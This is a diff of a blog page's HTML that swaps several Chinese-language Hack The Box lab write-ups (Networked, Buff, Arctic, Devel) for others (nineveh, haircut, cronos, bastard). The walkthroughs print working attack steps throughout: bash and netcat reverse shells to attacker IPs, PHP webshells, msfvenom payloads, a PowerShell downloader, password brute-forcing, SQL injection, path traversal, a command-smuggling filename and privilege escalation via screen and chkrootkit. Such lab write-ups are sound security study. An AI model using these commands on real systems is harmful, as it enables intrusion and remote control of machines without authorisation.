@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Networked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-nineveh" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/08/30/Networked/" class="article-date">
-  <time class="dt-published" datetime="2022-08-30T05:20:19.000Z" itemprop="datePublished">2022-08-30</time>
+    <a href="/2022/09/07/nineveh/" class="article-date">
+  <time class="dt-published" datetime="2022-09-08T02:14:55.000Z" itemprop="datePublished">2022-09-07</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/30/Networked/">Networked</a>
+      <a class="p-name article-title" href="/2022/09/07/nineveh/">nineveh</a>
     </h1>
   
 
@@ -93,52 +93,75 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/Networked/nmap.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/07/nineveh/nmap.png">
+#### port explore
+80:apache正常工作的界面
+443:443端口是一张图片
+#### 目录扫描
+80端口扫到phpinfo，表明fileupload功能处于开启状态
+443端口扫到db/index.php,是一个登录界面
+<img src="/2022/09/07/nineveh/dir.png">
+#### searchsploit
+`searchsploit phpliteadmin`
+存在两个sql注入的利用，剩余两个一个版本不符合一个是xss和csrf利用
+#### hydra爆破密码
+`hydra 10.10.10.43 -l abc -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"`
+hydra强制要求一个用户名，-P为选择一个密码文件，https-post-form为一个插件，它将下面的字符串以：隔开，/db/index.php是以post方式传递的路径，第二部分是需要以post方式传送的数据，将^PASS^的内容替换为密码字典中的密码，最后的Incorrect password是回复包中表明登录失败的检测语句
+<img src="/2022/09/07/nineveh/hydra.png">
+爆破出的密码为password123
+#### shell reverse
+在登录以后，存在一个名为test的数据库，但其中并不存在表
+根据`PHPLiteAdmin 1.9.3 - Remote PHP Code Injection`的文件显示，实现rce的方法为先创建一个以.php为后缀的数据库，然后在里面建一张表，插入一条数据为`<?php system($_REQUEST["cmd"]);?>`
+<img src="/2022/09/07/nineveh/php.png">
+可以看到hack.php存储的位置，但是不知道应该如何访问
+<img src="/2022/09/07/nineveh/loc.png">
+在80端口还存在一个/department，也是一个登陆界面
+在测试后可以知道这个登录接口存在一个admin的用户
+这里存在一个以数组方式提交密码的phpbug
+在登陆时用burpsuite改包，将password改为password[],发现可以绕过认证实现登录
+<img src="/2022/09/07/nineveh/note.png">
+里面存在一条note信息
+因为其url里面的形式为`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`
+所以我们推测可能存在文件包含漏洞
+在尝试过后只有`notes=files/ninevehNotes/../../../../../../etc/passwd`和`/ninevehNotes/../../etc/passwd`会回显
+接下来我们可以根据之前存储的位置/var/tmp/hack.php看看能不能实现命令回显
+<img src="/2022/09/07/nineveh/cmd.png">
+然后将cmd内的命令改为`bash -c 'bash -i >%26 /dev/tcp/10.10.14.5/8888 0>%261'`
+<img src="/2022/09/07/nineveh/shell.png">
+成功获得回弹的shell
+在/var/www/ssl目录中的secure_notes下有主页上显示的图片，通过`strings nineveh.png`可以发现该图片中隐藏了ssh密钥
+<img src="/2022/09/07/nineveh/ssh.png">
+将这个保存到本地然后用ssh2john转化成john能破解的格式
+但是22端口只在本地开放了
+尝试使用knock使22端口开放，配置文件存在于/etc/kncokd.conf
+首先进行敲门
+`knock 10.10.10.43 571 290 911`
+或者使用nmap进行敲门
+`nmap -Pn --host-timeout 100 --max-retries 0 -p 571,290,911 10.10.10.34`
+使用telnet检验22端口是否开放
+<img src="/2022/09/07/nineveh/open.png">
+成功实现以user身份登录
+<img src="/2022/09/07/nineveh/user.png">
+#### root
+在report文件夹中存在一些report.txt,每分钟执行了一次
+这些文件是一个叫rootkit的程序产生的
+接下来是利用rootkit提权
+大致就是在/tmp文件夹中输入转发shell的语句，然后等有root权限的chkrootkit扫过来的时候语句会被执行，这个漏洞给并不需要amrols权限使用www就可以实现
+`echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > update`
+<img src="/2022/09/07/nineveh/root.png">
+预期的行为是设置$file_port为等于"$file_port $i"。但是由于""缺少 ，bash将其视为设置file_port=$file_port然后运行$i
 
-<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/30/Networked/dirsearch.png">
-
-<h4 id="port-80"><a href="#port-80" class="headerlink" title="port 80"></a>port 80</h4><p>80端口只有一段文字<br>在源码里显示upload界面还未完成<br><img src="/2022/08/30/Networked/source.png"></p>
-<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>有两个比较关键的文件<br>一个是upload.php<br>一个是lib.php<br>lib.php中一共有6个函数，等会会在upload.php中被调用</p>
-<ul>
-<li><ol>
-<li>第一个是检查上传的文件名称<br>先按.切分<br>然后将名字命名为第一部分<br>然后把带有下划线的部分换成.<br>然后把余下的数组进行还原<br>返回一个name和一个用点隔开各单词的字符串</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>第二个是获取上传文件名<br>内容和第一个一样</li>
-</ol>
-</li>
-<li><ol start="3">
-<li>第三个是检查ip<br>传进来一个perfix和一个文件名<br>检查ip地址是否合法</li>
-</ol>
-</li>
-<li><ol start="4">
-<li>第四个是特定功能的过滤<br>首先是一个正则表达式<br>以a-z开始后跟一个‘-’，接a-z,0-9接‘-’<br>如果有finfo函数，就自己处理一下不返回原来应该返回的东西<br>如果有mine_content_type函数也自己处理一下</li>
-</ol>
-</li>
-<li><ol start="5">
-<li>第五个上检查文件类型<br>用上面一个函数返回的文件类型匹配image<br>匹配成功就返回true</li>
-</ol>
-</li>
-</ul>
-<p>upload.php<br>先检查文件类型和文件大小<br>只能传jpg,png,gif,jpeg</p>
-<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>apache httpd中支持一个文件含有多个后缀，并为不同的后缀执行不同的命令<br>apache配置文件中如果添加了php对应的解析，则上传的文件只要包含.php就能执行<br>所以这里只要上传一个xxx.php.png，就能绕开过滤<br>把png文件用vim打开在中间插一句<code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code><br>上传文件<br>成功上传并且能够显示命令<br>在传的文件后面跟?cmd&#x3D;id会显示出相应的信息<br><img src="/2022/08/30/Networked/cmd.png"></p>
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p><code>?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f</code><br><code>?cmd=bash+-i+%3E%26+/dev/tcp/10.10.14.3/4444+0%3E%261</code></p>
-<h4 id="guly权限"><a href="#guly权限" class="headerlink" title="guly权限"></a>guly权限</h4><p>在&#x2F;home&#x2F;guly里面有一个check_attack.php<br><img src="/2022/08/30/Networked/check.png"><br>还有一个计划任务脚本，每三分钟执行一次check_attack.php<br><img src="/2022/08/30/Networked/cron.png"><br>如果能控制$path或者$value就能实现命令注入<br>check_attack.php会检查文件但是所有不以ip开头的文件都会跳过检查<br>在uploads文件夹里新建一个<code>|nc -c bash 10.10.14.3 5555</code>文件<br>等待程序执行<br>会收到一个shell是guly权限的<br><img src="/2022/08/30/Networked/guly.png"></p>
-<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><img src="/2022/08/30/Networked/root1.png">
-查看一下sudo列表会发现有一个sh脚本可以执行
-<img src="/2022/08/30/Networked/sudo.png">
-尝试执行这个脚本会提示执行失败，但查看时确实存在该项
-<img src="/2022/08/30/Networked/root2.png">
-当输入空格分割的词汇时，会记录空格后的命令并尝试执行，可以尝试调一下/bin/bash
-得到root权限
 
 
+
+
+<p>第二种获得shell的方法是通过php的upload功能<br>首先我们将info.php的传输改为post并在方法体中加上content-type<br>&#96;<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—————————7db268605ae</p>
+<p>—————————–7db268605ae<br>Content-Disposition: form-data; name&#x3D;”dummyname”; filename&#x3D;”test.txt” Content-Type: text&#x2F;plainSecurity<br>Test<br>—————————–7db268605ae<br>&#96;<br>然后在返回的页面上我们可以看到传送的内容被存储器来了<br><img src="/2022/09/07/nineveh/text.png"><br>修改脚本为如下状态<br><img src="/2022/09/07/nineveh/py.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/30/Networked/" data-id="cl7fxj1na0000d5cp4j2f58uz" data-title="Networked" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/07/nineveh/" data-id="cl7sovgas0000imcp1uh2h7z8" data-title="nineveh" class="article-share-link">Share</a>
       
       
       
@@ -150,10 +173,10 @@
 
 
   
-    <article id="post-Buff" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-haircut" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/08/29/Buff/" class="article-date">
-  <time class="dt-published" datetime="2022-08-30T00:58:48.000Z" itemprop="datePublished">2022-08-29</time>
+    <a href="/2022/09/06/haircut/" class="article-date">
+  <time class="dt-published" datetime="2022-09-07T02:45:11.000Z" itemprop="datePublished">2022-09-06</time>
 </a>
     
   </div>
@@ -164,7 +187,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/29/Buff/">Buff</a>
+      <a class="p-name article-title" href="/2022/09/06/haircut/">haircut</a>
     </h1>
   
 
@@ -172,29 +195,71 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Buff/nmap.png">
-该机器开启了8080和7680端口
-详细扫描
-<img src="/2022/08/29/Buff/nmap2.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/06/haircut/nmap.png">
+#### port explore
+22:ssh
+80:图片
+#### 目录扫描
+<img src="/2022/09/06/haircut/dir.png">
+<img src="/2022/09/06/haircut/gobuster.png">
+有一个uploads路径
+test.html好像是提示禁用了curl
+还有一个exposed.php文件
+直接访问uploads是403forbindden
+用curl进行访问显示的是301 moved Permanently,表明被永久的移除了
+<img src="/2022/09/06/haircut/curl.png">
+访问exposed.php，是一个访问其他网址的页面，它得到的结果类似于执行curl产生的结果
+<img src="/2022/09/06/haircut/curl2.png">
+当curl的输出是通过管道从另一个进程打印输出的时候，就会得到类似上面的结果
+<img src="/2022/09/06/haircut/curl3.png">
+所以我们可以推测该页面的函数写法是
+    if post
+        system('curl ' . $POST["formurl"] . '/path/to/some/directory')
+    end if
+#### filter enumeration
+当我们在exposed.php上输入` | ifconfig`时，页面会显示`|`是一个非法符号
+<img src="/2022/09/06/haircut/curl4.png">
+通过burp进行fuzz，发现过滤了很多符号
+尝试通过curl -b看看信息能不能放在cookie里传送
+`curl -b`是添加cookie
+<img src="/2022/09/06/haircut/cookie.png">
+`nc -k<通信端口>`:强制 nc 待命链接.当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 -k 我们可以强制服务器保持连接并继续监听端口。
+接着我们可以尝试上传一个反弹shell的php到uploads文件夹下
+用 -o 将文件保存到uploads下：`http://10.10.14.5/sys.php -o uploads/abc.php`
+然后使用curl检查上传的文件是否能正常使用
+<img src="/2022/09/06/haircut/cmd.png">
+在确认能够正常使用后，用该php开一个nc将一个真正的shell回弹到当前机器上
+因为如果以post方式提交请求的话，cmd内传递的命令会断掉，所以需要将请求更改为get并对cmd传递的参数进行urlencode
+`curl -G http://10.10.14.5/abc.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/8888 0>&1'"`
+得到user权限
+<img src="/2022/09/06/haircut/user.png">
+#### root
+在SUID中存在一个/usr/bin/screen-4.5.0
+去exploit-db中进行搜索，可以找到相关的提权(payload)[https://www.exploit-db.com/exploits/41154]
+该利用的实现细节如下：
+在 Screen 版本 4.5.0 中，如果用户指定日志文件，程序将打开并附加到该日志文件。因为screen通常设置为SUID才能运行，这意味着以 root 身份写入
++ 1.首先它创建了一个库文件libhax.c
+这个库文件存在一个dropshell功能，它拥有一个__attribute__ ((__constructor__)),这个会在进入主函数之前执行，其功能就是改变/tmp/rootshell的权限，使root为该文件夹的所有者，然后给该文件赋予SUID权限，并移除/etc/ld.so.preload
++ 2.创建一个/tmp/rootshell
+将所有的user和组的id都设置为root然后运行/bin/sh
++ 3.然后进行利用
+`screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"`
+`-D -m`:以detached模式开启screen，但不启动新的进程
+`-L ld.so.preload`:打开窗口的自动输出记录
+`echo -ne "\x0a/tmp/libhax.so"`:另起一行并加载libhax.so，`\x0a`代表换行
+这条命令会启动screen输出库的路径，该路径将记录到/etc/ld.so.preload文件中，然后退出
+/etc/ld.so.preload保存每次运行任何程序时都会尝试加载的库列表。所以下次以root身份运行时，恶意库将以root身份运行。该脚本通过再次调用 screen 来启动它
+最后它会以SUID权限执行/tmp/rootshell
+直接执行失败，将其拉到本地运行一遍，生成libhax.so和rootshell后传到目标机
+再执行一遍第三部分
+<img src="/2022/09/06/haircut/part3.png">
+<img src="/2022/09/06/haircut/root.png">
 
-<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/29/Buff/dir1.png">
-<img src="/2022/08/29/Buff/dir2.png">
-<img src="/2022/08/29/Buff/dir3.png">
-对目录进行扫描
-存在upload界面和一个register界面
-upload目前不允许访问
-可以尝试先注册一个用户
-<img src="/2022/08/29/Buff/upload1.png">
-<img src="/2022/08/29/Buff/profile.png">
-注册界面也只允许admin进行访问
-
-<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>在网页上我们可以看到这个网站是由gym management system 搭起来的<br>尝试用searchsploit搜索<br><img src="/2022/08/29/Buff/searchsploit.png"><br>尝试直接用远程代码执行<br><img src="/2022/08/29/Buff/upload2.png"><br>获得了web的权限<br>但是发现只能在该目录下活动<br>尝试一下传一个nc上去<br><img src="/2022/08/29/Buff/smb1.png"><br>开一个smb服务器上传<br><img src="/2022/08/29/Buff/nc1.png"><br><img src="/2022/08/29/Buff/nc2.png"><br>用systeminfo配合windows-exploit-suggester查看一下</p>
-<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p><code>netstat -ano | findSTR TCP | findstr &quot;:0&quot;</code><br>使用上述命令查看架在本地端口的应用<br><img src="/2022/08/29/Buff/netstat.png"><br>有一个运行在127.0.0.1上的应用<br><code>tasklist /v | findstr 2564</code><br>通过上面这条命令查看这是什么应用<br>这里有点问题，但最后找到的进程应该是cloudme.exe<br><img src="/2022/08/29/Buff/cloudme.png"><br><img src="/2022/08/29/Buff/cloudme1112.png"><br><code>powershell -w hidden -noni -nop -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.3/chisel.exe&#39;,&#39;c.exe&#39;)&quot;</code><br>用上述指令下载chisel.exe到windows上进行端口转发<br>kali上开一个简易的http服务器<br><code>python3 -m http.server 80</code><br>然后在两边进行端口映射<br><img src="/2022/08/29/Buff/chisel.png"><br>查看poc，该poc里给出了用msfvenom生成payload的方式<br><img src="/2022/08/29/Buff/payload.png"><br><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b &#39;\x00\x0A\x0D&#39; -f python -v payload</code><br>在本地开启nc进行监听<br><img src="/2022/08/29/Buff/root.png"></p>
-
+</通信端口>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/29/Buff/" data-id="cl7fqgxhj00000tcpfbc8c7y8" data-title="Buff" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/06/haircut/" data-id="cl7rapn1m0000ejcp7qf523a5" data-title="haircut" class="article-share-link">Share</a>
       
       
       
@@ -206,10 +271,10 @@ upload目前不允许访问
 
 
   
-    <article id="post-Arctic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-cronos" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/08/29/Arctic/" class="article-date">
-  <time class="dt-published" datetime="2022-08-29T04:59:10.000Z" itemprop="datePublished">2022-08-29</time>
+    <a href="/2022/09/06/cronos/" class="article-date">
+  <time class="dt-published" datetime="2022-09-07T01:06:42.000Z" itemprop="datePublished">2022-09-06</time>
 </a>
     
   </div>
@@ -220,7 +285,7 @@ upload目前不允许访问
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/29/Arctic/">Arctic</a>
+      <a class="p-name article-title" href="/2022/09/06/cronos/">cronos</a>
     </h1>
   
 
@@ -228,49 +293,45 @@ upload目前不允许访问
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Arctic/nmap1.png">
-<img src="/2022/08/29/Arctic/nmap2.png">
-#### port 135
-#### port 8500
-web访问8500端口，可以看到一个目录结构，在http://10.10.10.11:8500/CFIDE/administrator/该目录下能看到一个登陆界面，且用户名是admin
-该登陆界面显示为adobe coldfusion 8
-<img src="/2022/08/29/Arctic/85001.png">
-在源码中可以看到密码上需要加密的，有一个salt
-<img src="/2022/08/29/Arctic/85002.png">
-<img src="/2022/08/29/Arctic/burp.png">
-#### get web shell
-搜索coldfusion可以找到几个可利用的文件
-<img src="/2022/08/29/Arctic/cold.png">
-看到一个可以通过msf进行文件上传的version8的漏洞利用
-直接利用显示失败
-查看该利用的源码
-在利用阶段该脚本首先上传一个文件到/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
-然后通过访问触发该文件
-于是我们可以自己制作一个jspshell并上传
-`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f raw > shell.jsp`
-`curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00`
-在传完了以后在根目录下会出现一个新的文件夹userfiles
-<img src="/2022/08/29/Arctic/web.png">
-但是该目录下并不存在刚刚上传的文件
-说明上传时触发了防御机制
-MSF脚本中上传的是txt文件，且将上传类型改为了application/x-java-archive
-`curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/abc.jsp%00'`
-<img src="/2022/08/29/Arctic/web2.png">
-可以看到这次已经上传成功了
-开一个nc监听8888端口，并访问触发该脚本
-<img src="/2022/08/29/Arctic/nc1.png">
-拿到shell权限后使用systeminfo和windows-exploit-suggester
-<img src="/2022/08/29/Arctic/shell1.png">
-用ms10-059
-用smbserver传一个MS10-059.exe到目标机器的programdata
-开一个nc监听新的端口
-<img src="/2022/08/29/Arctic/root.png">
-
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/06/cronos/nmap.png">
+#### port explore
+22
+53:DNS服务的端口
+80:80端口是apache2正常工作的默认界面
+#### 目录遍历
+<img src="/2022/09/06/cronos/dir.png">
+目录遍历没扫出什么来，所以53端口可能存在可以利用的漏洞
+可以先用host命令列出该域名下的所有主机名
+`host -l cronos.htb 10.10.10.13`
+<img src="/2022/09/06/cronos/domain.png">
+结果存在三个不同的网址，将其加入/etc/hosts文件
+访问www.cronos.htb,会定向到一个网站，由Laravel搭建
+admin.cronos.htb是一个登陆界面
+在admin.cronos.htb页面尝试使用万能密码进行登录`admin' or 1=1#`,成功实现登录
+<img src="/2022/09/06/cronos/admin.png">
+感觉可以实现堆叠查询
+<img src="/2022/09/06/cronos/ifconfig.png">
+<img src="/2022/09/06/cronos/nc.png">
+用nc反弹一个shell到本机
+(`rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0/tmp/p`)
+`8.8.8.8 | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.5 8888 >/tmp/f`
+(`rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.41+1234+>/tmp/f`)
+用python改进交互式终端
+`python -c 'import pty;pty.spawn("/bin/sh")'`
+成功得到user权限
+#### root
+<img src="/2022/09/06/cronos/srpn.png">
+可以看到/var/www/laravel/artisan这个文件会以root权限每分钟运行一次
+那我们可以尝试用一个反弹shell的php文件覆盖它，让它执行
+<img src="/2022/09/06/cronos/rev.png">
+上传到目标机并覆盖原文件
+成功获得root权限
+<img src="/2022/09/06/cronos/root.png">
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/29/Arctic/" data-id="cl7edtt3w0000jtcpczmx23a7" data-title="Arctic" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/06/cronos/" data-id="cl7r02fye0000zfcpdehqfi47" data-title="cronos" class="article-share-link">Share</a>
       
       
       
@@ -282,10 +343,10 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
 
 
   
-    <article id="post-Devel" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-bastard" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/08/28/Devel/" class="article-date">
-  <time class="dt-published" datetime="2022-08-29T01:43:37.000Z" itemprop="datePublished">2022-08-28</time>
+    <a href="/2022/09/06/bastard/" class="article-date">
+  <time class="dt-published" datetime="2022-09-06T06:48:32.000Z" itemprop="datePublished">2022-09-06</time>
 </a>
     
   </div>
@@ -296,7 +357,7 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/28/Devel/">Devel</a>
+      <a class="p-name article-title" href="/2022/09/06/bastard/">bastard</a>
     </h1>
   
 
@@ -304,31 +365,47 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><p>nmap -p- –min-rate 10000  10.10.10.5<br><img src="/2022/08/28/Devel/nmap1.png"><br>详细扫描21,80端口<br><img src="/2022/08/28/Devel/nmap2.png"><br>发现21端口可以进行匿名登录</p>
-<h4 id="21-port"><a href="#21-port" class="headerlink" title="21 port"></a>21 port</h4><p>ftp 10.10.10.5<br><img src="/2022/08/28/Devel/ftp1.png"><br>该网站下存在一个htm页面和一个welcome的png</p>
-<h4 id="80-port"><a href="#80-port" class="headerlink" title="80 port"></a>80 port</h4><p>80端口的默认界面是一个IIS7默认界面<br>使用dirsearch进行目录扫描<br><img src="/2022/08/28/Devel/dirsearch.png"><br>有一个aspnet_client,但是禁止访问了<br><img src="/2022/08/28/Devel/request.png"><br>请求头表示这是一个ASP.NET</p>
-<h4 id="shell-as-a-web"><a href="#shell-as-a-web" class="headerlink" title="shell as a web"></a>shell as a web</h4><p>尝试用ftp往上面传一个shell(cmd.aspx)<br><img src="/2022/08/28/Devel/ftp2.png"><br>尝试访问这个界面<br><img src="/2022/08/28/Devel/web1.png"><br><img src="/2022/08/28/Devel/web2.png"><br>本地kali开启smbserver<br><img src="/2022/08/28/Devel/smb.png"><br>共享当前文件夹并在该文件夹里面放一个nc.exe<br>在传到网站上的webshell中执行反弹程序<br><code>\\10.10.14.2\share\nc.exe -e cmd.exe 10.10.14.2 4444</code><br>并在本地开启nc进行监听，能收到反弹的shell<br><img src="/2022/08/28/Devel/webshell.png"><br>该权限是网站权限所有的user目录都不能访问</p>
-<h4 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h4><img src="/2022/08/28/Devel/systeminfo.png">
-查看系统信息
-<img src="/2022/08/28/Devel/windows-exploit-suggester.png">
-发现有多个可以利用的漏洞
-一个github上面有很多已经编译过的exe利用程序
-[https://github.com/abatchy17/WindowsExploits]()
-用ms11-011失败
-用ms11-046成功
-#### shell with msf
-用msfvenom 制作一个aspx上传到服务器上
-`msfvenom -p wimdows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f shell.aspx`
-<img src="/2022/08/28/Devel/meter.png">
-<img src="/2022/08/28/Devel/meter2.png">
-<img src="/2022/08/28/Devel/meter3.png">
-<img src="/2022/08/28/Devel/meter4.png">
-<img src="/2022/08/28/Devel/meter5.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/06/bastard/nmap.png">
+#### port explore
+80:80端口是一个认证登陆界面，可以注册新用户，但是注册新用户会发送一封邮件到你的邮箱，这是一个内网靶场，故不会是通过这种方法注册一个新用户
+135:一般认为是rpc服务的端口，可以尝试用rpcclient连接测试
+`rpcclient -U "" -N 10.10.10.9`
+但是登录失败
+#### 目录扫描
+目录扫描时发现一个changelog.txt，其中所记录的最新的durpal是7.54,所以可以合理怀疑该系统的版本应该是7.54
+`dirsearch -u 10.10.10.9 -e php -x 403,404 -t 50`
+searchsploit drupal 7可以搜到几个需要认证后的代码执行和一个7.x版本的通用远程代码执行
+该exploit会攻击由服务扩展创建的REST端点，我们只需要找出REST端点的名称即可利用该漏洞
+<img src="/2022/09/06/bastard/payload.png">
+将上面的替换成目标网址和目标endpoint_path
+将写入的文件内容替换为`<?php system($_REQUEST["cmd"]); ?>`
+利用php执行41564.php
+<img src="/2022/09/06/bastard/41564.png">
+得到session和user的json文件
+<img src="/2022/09/06/bastard/session.png">
+<img src="/2022/09/06/bastard/user.png">
+用hashcat尝试破解一下admin的登陆密码,但是很慢
+<img src="/2022/09/06/bastard/d7.png">
+既然我们有了一个可以执行cmd的php页面，那么我们可以尝试让它下载nc并与我们建立连接
+<img src="/2022/09/06/bastard/whoami.png">
+#### user
+用smbserver共享nc并让目标机器访问该文件并使用nc连接到本机
+`?cmd=\\10.10.14.5\share\nc.exe -e cmd 10.10.14.5 8888`
+<img src="/2022/09/06/bastard/nc.png">
+传一个sherlock进行漏洞信息收集
+`powershell.exe -exec bypass -Command "& {Import-Module C:\inetpub\drupal-7.54\Sherlock.ps1;Find-AllVulns}`
+<img src="/2022/09/06/bastard/ker1.png">
+<img src="/2022/09/06/bastard/ker2.png">
+可以尝试利用MS15-051
+<img src="/2022/09/06/bastard/root1.png">
+<img src="/2022/09/06/bastard/root2.png">
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/28/Devel/" data-id="cl7edtt450003jtcp8iiw3r03" data-title="Devel" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/06/bastard/" data-id="cl7pyk3mj00001icp5713gida" data-title="bastard" class="article-share-link">Share</a>
       
       
       
@@ -340,10 +417,10 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
 
 
   
-    <article id="post-oscp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-popcorn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/28/oscp/" class="article-date">
-  <time class="dt-published" datetime="2022-07-28T09:31:12.000Z" itemprop="datePublished">2022-07-28</time>
+    <a href="/2022/09/05/popcorn/" class="article-date">
+  <time class="dt-published" datetime="2022-09-06T01:50:11.000Z" itemprop="datePublished">2022-09-05</time>
 </a>
     
   </div>
@@ -354,7 +431,7 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/28/oscp/">oscp</a>
+      <a class="p-name article-title" href="/2022/09/05/popcorn/">popcorn</a>
     </h1>
   
 
@@ -362,485 +439,59 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h3 id="1-get-comfortable-with-kali-Linux"><a href="#1-get-comfortable-with-kali-Linux" class="headerlink" title="1.get comfortable with kali Linux"></a>1.get comfortable with kali Linux</h3><h4 id="Linux-file-system"><a href="#Linux-file-system" class="headerlink" title="Linux file system"></a>Linux file system</h4><p>&#x2F;bin         contains basic programs(ls,cat)<br>&#x2F;sbin        system programs(fdisk,mkfs,sysctl)<br>&#x2F;etc         configuration files<br>&#x2F;tmp         temporary files(typically deleted on boot)<br>&#x2F;usr&#x2F;bin     application(apt,ncat,nmap)<br>&#x2F;usr&#x2F;share   application support and data files</p>
-<h4 id="basic-command"><a href="#basic-command" class="headerlink" title="basic command"></a>basic command</h4><ul>
-<li>man</li>
-</ul>
-<ul>
-<li>man -k(keyword search) passwd  </li>
-<li>man -k ‘^passwd$’</li>
-</ul>
-<ul>
-<li>apropos (like man -k)</li>
-<li>ls</li>
-<li>cd</li>
-<li>mkdir</li>
